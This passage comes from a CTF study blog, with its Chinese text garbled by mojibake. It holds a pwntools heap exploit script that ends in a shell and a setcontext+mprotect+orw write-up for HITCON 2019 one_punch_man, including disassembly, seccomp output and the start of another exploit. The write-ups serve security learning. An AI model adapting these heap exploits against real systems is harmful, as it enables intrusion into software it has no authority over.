class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;3. Free&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Enter size of chunk :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Enter index :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;3. Free&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Enter index of chunk :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Enter data :&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;3. Free&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Enter index :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0x18</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>,<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x41</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>,<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">6</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x71&#x27;</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p16(<span class="number">0x7020</span>))</span><br><span class="line">    edit(<span class="number">1</span>,p16(<span class="number">0x1aed</span>))</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="number">9</span>)</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    edit(<span class="number">13</span>,p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">10</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    edit(<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p16(<span class="number">0x1b00</span>))</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="number">12</span>)</span><br><span class="line">    edit(<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+<span class="string">&#x27;\xa4\xd3\xaf&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Enter name :&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;rootzhang&#x27;</span>)</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

<h2 id="House-of-Pig"><a href="#House-of-Pig" class="headerlink" title="House of Pig"></a>House of Pig</h2><p>æ¶‰åŠäº†io_file,æš‚æ—¶ä¸åšæ€»ç»“</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/09/setcontext-mprotect-orw/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/09/setcontext-mprotect-orw/" class="post-title-link" itemprop="url">setcontext+mprotect+orw</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-01-09 16:07:55 / ä¿®æ”¹æ—¶é—´ï¼š16:08:22" itemprop="dateCreated datePublished" datetime="2022-01-09T16:07:55+08:00">2022-01-09</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="setcontext-mprotect-orw"><a href="#setcontext-mprotect-orw" class="headerlink" title="setcontext+mprotect+orw"></a>setcontext+mprotect+orw</h1><p>æ‘†çƒ‚å¤šæ—¥çš„ç¬¬ä¸€æ¬¡æç¬”ï¼Œè¿™ç¯‡åšå®¢å…¶å®æƒ³å†™å¥½ä¹…äº†ï¼Œä½†æ˜¯ç”±äºå„ç§åŸå› æ‹–åˆ°ç°åœ¨ï¼Œä¸è¯´åºŸè¯äº†ï¼Œç›´æ¥å¼€å†™ã€‚</p>
<p>å…ˆç»†è‡´çš„è®²è§£ä¸€ä¸‹setcontextå’Œorw</p>
<h2 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h2><p>ä¸€ä¸ªå¤§æ¦‚å‡½æ•°ä¸€æ ·çš„ä¸œè¥¿ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯æŠŠé€šè¿‡å®ƒæŠŠç¨‹åºè·³è½¬åˆ°æˆ‘é—¨å·²ç»è®¾ç½®å¥½çš„ropä¸Šé¢ï¼Œä½¿ç”¨è¿™ä¸ªæ‰‹æ³•çš„æ¡ä»¶æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯ä½ èƒ½è·³åˆ°è¿™ä¸ªå‡½æ•°ä¸Šé¢ï¼ˆæ‹¿åˆ°ç¨‹åºæµï¼‰ï¼ŒäºŒæ˜¯æ§åˆ¶äº†ripï¼Œä¸‹é¢æ˜¯setcontextçš„æ±‡ç¼–ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0x00007fc35bf5f1b5 &lt;+53&gt;:	mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">   0x00007fc35bf5f1bc &lt;+60&gt;:	mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">   0x00007fc35bf5f1c3 &lt;+67&gt;:	mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">   0x00007fc35bf5f1c7 &lt;+71&gt;:	mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">   0x00007fc35bf5f1cb &lt;+75&gt;:	mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">   0x00007fc35bf5f1cf &lt;+79&gt;:	mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">   0x00007fc35bf5f1d3 &lt;+83&gt;:	mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">   0x00007fc35bf5f1d7 &lt;+87&gt;:	mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">   0x00007fc35bf5f1de &lt;+94&gt;:	push   rcx</span><br><span class="line">   0x00007fc35bf5f1df &lt;+95&gt;:	mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">   0x00007fc35bf5f1e3 &lt;+99&gt;:	mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">   0x00007fc35bf5f1ea &lt;+106&gt;:	mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">   0x00007fc35bf5f1f1 &lt;+113&gt;:	mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x00007fc35bf5f1f5 &lt;+117&gt;:	mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">   0x00007fc35bf5f1f9 &lt;+121&gt;:	mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">   0x00007fc35bf5f1fd &lt;+125&gt;:	xor    eax,eax</span><br><span class="line">   0x00007fc35bf5f1ff &lt;+127&gt;:	ret    </span><br><span class="line">   0x00007fc35bf5f200 &lt;+128&gt;:	mov    rcx,QWORD PTR [rip+0x398c61]        # 0x7fc35c2f7e68</span><br><span class="line">   0x00007fc35bf5f207 &lt;+135&gt;:	neg    eax</span><br><span class="line">   0x00007fc35bf5f209 &lt;+137&gt;:	mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">   0x00007fc35bf5f20c &lt;+140&gt;:	or     rax,0xffffffffffffffff</span><br><span class="line">   0x00007fc35bf5f210 &lt;+144&gt;:	ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸æ˜¯è·³åˆ°setcontextçš„å¼€å¤´ï¼Œè€Œæ˜¯è·³åˆ°53è¿™ä¸ªä½ç½®ï¼Œå½“æ‰§è¡Œä¸‹é¢çš„ä»£ç åï¼Œå°±å¯ä»¥é€šè¿‡ripç»™å¾ˆå¤šå¯„å­˜å™¨èµ‹å€¼ï¼ŒåŒ…æ‹¬rspï¼Œè¿˜èƒ½é€šè¿‡rcxæ§åˆ¶æ ˆé¡¶ä¿¡æ¯ï¼Œæ“ä½œæ‰‹æ³•å°±æ˜¯å…ˆé€šè¿‡rdi+0xa0æŠŠrspæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„ropçš„åœ°å€ï¼Œç„¶åå†é€šè¿‡rdi+0xa8è®©rcxå‚¨å­˜retçš„åœ°å€ï¼Œç„¶åæŠŠretçš„åœ°å€pushåˆ°æ ˆä¸Šï¼Œæœ€åçš„æ‰§è¡Œé¡ºåºå°±æ˜¯è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7fe87be4e1ff &lt;setcontext+127&gt;        ret  //è‡ªå·±çš„ret  </span><br><span class="line">    â†“</span><br><span class="line">0x7fe87bdfc8aa                         ret  //push rcx  </span><br><span class="line">    â†“</span><br><span class="line">0x7fe87be1d5bf &lt;init_cacheinfo+239&gt;    pop    rdi//ä¼ªé€ çš„rop</span><br><span class="line">0x7fe87be1d5c0 &lt;init_cacheinfo+240&gt;    ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿˜å¯ä»¥é€šè¿‡ropå†æŠŠç¨‹åºæµè·³åˆ°åˆ«çš„åœ°æ–¹ï¼Œå¾ˆå¥½ç©ã€‚</p>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>å½“æœ‰äº›ç¨‹åºè¢«æ²™ç®±ä¿æŠ¤åå°±ä¸èƒ½ç›´æ¥è°ƒç”¨system(â€œ/bin/shâ€)æ¥æ‹¿åˆ°æƒé™äº†ï¼Œæ¯”å¦‚è¿™ä¸ªç¨‹åº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/tcache/HITCON 2019 one_punch_man$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022</span><br><span class="line"> 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0024: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>åªå…è®¸ç¨‹åºè°ƒç”¨read,write,openå’Œmprotectè¿™å‡ ä¸ªæˆ‘è®¤è¯†çš„å‡½æ•°ï¼Œé‚£å°±åªèƒ½orwäº†ï¼Œä¸è¿‡ç°åœ¨åœ¨æˆ‘çœ‹æ¥orwæœ‰ä¸¤ç§ç±»å‹ï¼Œä¸€ç§æ˜¯æ„é€ ropæ¥å®Œæˆæ‰“å°flag,ä¸€ç§æ˜¯ç›´æ¥æ„é€ ä»£ç ï¼Œè®©ä»–æ‰§è¡Œorwä»£ç ï¼ˆä¸è¿‡è¿™ç§éœ€è¦mprotectååŠ©ï¼‰ï¼Œè°ƒç”¨orwéœ€è¦é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥å®Œæˆï¼Œå³syscall,æ¯ä¸ªå‡½æ•°éƒ½å¯¹åº”ä¸€ä¸ªè°ƒç”¨å·ï¼Œæ¯”å¦‚opençš„è°ƒç”¨å·æ˜¯2ï¼Œreadçš„è°ƒç”¨å·æ˜¯0ï¼Œwriteçš„è°ƒç”¨å·æ˜¯1,è°ƒç”¨æ—¶å¯¹raxèµ‹å€¼å°±è¡Œã€‚</p>
<p>å®Œæˆå‰ç½®çŸ¥è¯†ï¼Œä¸‹é¢å…·ä½“é¢˜ç›®å…·ä½“åˆ†æ</p>
<h4 id="HITCON-2019-one-punch-man"><a href="#HITCON-2019-one-punch-man" class="headerlink" title="HITCON 2019 one_punch_man"></a>HITCON 2019 one_punch_man</h4><p>ç®—æ˜¯å¤ç°çš„æœ€è‰°éš¾çš„ä¸€é“é¢˜ï¼Œé™¤äº†ä¸€äº›ä¸çŸ¥é“çš„glibcçš„ç‰¹æ€§ä»¥å¤–ï¼Œè¿˜å› ä¸ºæŒ‰ç…§wikiä¸Šçš„æ€è·¯å¤ç°çš„ä»£ç å°±è·‘ä¸é€šï¼Œæœ€åè‡ªå·±æƒ³å‡ºæ¥ä¸€ä¸ªè¿™ä¸ªç¬¨åŠæ³•ã€‚</p>
<p>æºç å¤ªé•¿å°±ä¸çœ‹äº†ï¼Œä¸»è¦æœ‰å››ä¸ªåŠŸèƒ½ï¼Œæ¼æ´æ˜¯ufa,ç„¶åä¸€èˆ¬æƒ…å†µä¸‹åªèƒ½ä½¿ç”¨calloc,callocä¸èƒ½ä½¿ç”¨tcacheä¸Šé¢çš„å †ï¼Œå…¶æ¬¡å †çš„å¤§å°è®¾ç½®ä¸ºå¤§äº0x80,æ„å‘³ç€ä¹Ÿä¸èƒ½ä½¿ç”¨fastbinä¸Šé¢çš„å †ï¼Œåœ¨glibcé«˜ç‰ˆæœ¬çš„æƒ…å†µä¸‹ä½¿ç”¨å‡ºfastå’Œtcacheçš„å †æ‹¿åˆ°ç¨‹åºæµå¾ˆéš¾ï¼Œå¥½åœ¨ç¨‹åºç»™äº†åé—¨å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_15BB</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">char</span> *)(qword_4030 + <span class="number">32</span>) &lt;= <span class="number">6</span> )</span><br><span class="line">    error(<span class="string">&quot;gg&quot;</span>, a2);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x217</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">    error(<span class="string">&quot;err&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x217</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;io&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Serious Punch!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;unk_2128);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªè¦è®©è¿™ä¸ªåœ°å€çš„æ•°å¤§äº6å°±è¡Œï¼Œå½“ä¸€ä¸ªåœ°å€çš„æ•°å˜å¤§é¦–å…ˆæƒ³åˆ°äº†unsortedattackbinï¼Œä½†libc.2.27.soå·²ç»å¯¹unsortedbinä¸Šé¢çš„å †ä¸¥åŠ ç®¡æ§ï¼Œå½“ä¸€ä¸ªå †è„±ç¦»æ—¶ï¼Œä¼šä¸¥æ ¼æ£€æŸ¥fdå’Œbkï¼Œé€šè¿‡wikiå¾—çŸ¥smallbiné…åˆtcacheä¹Ÿå¯ä»¥å®Œæˆç±»ä¼¼çš„è¡Œä¸ºï¼Œæ¯”å¦‚å…ˆè®©tcacheä¸Šé¢çš„0x200çš„binä¸Šå…­ä¸ªå †ï¼Œè®©smallbinçš„0x200ä¸Šé¢ä¸Š2ä¸ªå †ï¼Œç„¶åç”³è¯·0x200,é¦–å…ˆä¼šåˆ†é…smallbinä¸Šé¢çš„ä¸€ä¸ªå †ç»™ä½ ï¼Œè®©åæŠŠå¦ä¸€ä¸ªå †è„±é“¾æ”¾å…¥tcacheä¸Šé¢ï¼Œåªè¦æ›´æ”¹åé¢çš„bkï¼Œè®©å…¶è„±é“¾çš„æ—¶å€™å°±å¯ä»¥å‘bk-&gt;fdå†™å…¥ä¸€ä¸ªåœ°å€äº†ï¼Œè¿™ä¸ªåœ°å€è‚¯å®šå¾ˆå¤§ï¼Œå’Œunsortedbinçš„æ€è·¯å¾ˆåƒã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x130 [  6]: 0x55563b0fa850 â€”â–¸ 0x55563b0fa720 â€”â–¸ 0x55563b0fa5f0 â€”â–¸ 0x55563b0fa4c0 â€”â–¸ 0x55563b0fa390 â€”â–¸ 0x55563b0fa260 â—‚â€” 0x0</span><br><span class="line">0x210 [  7]: 0x55563b0fb5e0 â€”â–¸ 0x55563b0fb3d0 â€”â–¸ 0x55563b0fb1c0 â€”â–¸ 0x55563b0fafb0 â€”â–¸ 0x55563b0fada0 â€”â–¸ 0x55563b0fab90 â€”â–¸ 0x55563b0fa980 â—‚â€” 0x0</span><br><span class="line">0x220 [  1]: 0x55563b0fe8f0 â—‚â€” 0x0</span><br><span class="line">0x410 [  7]: 0x55563b0fd8b0 â€”â–¸ 0x55563b0fd4a0 â€”â–¸ 0x55563b0fd090 â€”â–¸ 0x55563b0fcc80 â€”â–¸ 0x55563b0fc870 â€”â–¸ 0x55563b0fc460 â€”â–¸ 0x55563b0fc050 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x130: 0x55563b0fdf90 â€”â–¸ 0x55563b0fbd00 â€”â–¸ 0x7f0f0340adc0 (main_arena+384) â—‚â€” 0x55563b0fdf90</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ä¿®æ”¹bkçš„æ—¶å€™ä¹Ÿå¾—è®©fdæœ‰æ„ä¹‰ï¼Œä¸ç„¶fd-&gt;bk=bkå°±ä¼šä¸æˆç«‹</p>
<p>ä¿®æ”¹å®Œåå°±å¯ä»¥ä½¿ç”¨mallocäº†ï¼Œå“¦å¯¹å½“smallbinä¸Šçš„å †è¿›å…¥tcacheä¸Šé¢æ—¶tcacheå°±ä¼šå‡ºé—®é¢˜ï¼Œä¸èƒ½è¿›åªèƒ½å‡ºï¼Œæ‰€ä»¥0x217å¾—å…ˆå‡†å¤‡å¥½æ‰è¡Œã€‚</p>
<p>è„šæœ¬</p>
<p>ç½‘ä¸Šæœäº†ä¸€åœˆï¼Œæ²¡æœ‰åƒæˆ‘åšçš„è¿™å¤æ‚çš„ï¼Œæˆ‘æ˜¯ç”¨mprotectåšçš„</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    sh.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dock</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;50056&#x27;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">retire</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span 